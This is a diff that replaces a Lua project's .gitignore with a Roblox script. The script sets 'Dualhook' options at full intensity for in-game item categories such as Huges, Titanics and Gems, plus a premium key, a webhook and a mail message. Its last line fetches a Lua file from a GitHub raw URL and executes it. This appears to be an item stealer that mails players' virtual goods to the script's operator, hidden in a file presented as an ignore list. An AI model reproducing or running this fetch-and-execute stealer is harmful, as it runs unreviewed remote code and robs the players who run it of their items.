@@ -1,41 +1,44 @@
-# Compiled Lua sources
-luac.out
-
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+getgenv().Settings = {
+    PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
+    Webhook = true, -- By Making This True The Users Of Your Script Will Be Able
+    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
+    MailMessage = "Lol",
+  Titanics = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Banana = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Huges = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Pogs = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Exclusives = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Events = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Secrets = {
+       Dualhook = true,
+       Intensity = 100--%
+   },
+   HC_DM_Mythics = {
+       Dualhook = true,
+       Intensity = 100--%
+   },
+   Gems = {
+       Dualhook = true,
+       Intensity = 100--%
+  }
+}
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Vault/main/prm.lua", true))()
